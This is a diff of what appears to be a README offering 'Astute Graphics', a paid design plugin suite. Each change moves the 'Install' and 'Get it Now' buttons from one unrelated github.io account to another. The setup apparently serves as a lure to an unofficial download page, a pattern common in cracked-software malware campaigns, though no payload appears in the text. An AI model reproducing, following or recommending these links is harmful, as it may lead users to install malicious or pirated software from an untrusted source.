@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://a4-glent.github.io/.github/astuteGraphics)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poxmell.github.io/.github/astuteGraphics)
 
 </div>
 
@@ -81,7 +81,7 @@ Astute Graphics occupies a unique market position — not a standalone design ap
 
 <p align="center">
 
-[![Get it Now Astute Graphics](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/astuteGraphics)
+[![Get it Now Astute Graphics](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/astuteGraphics)
 
 </p>
 
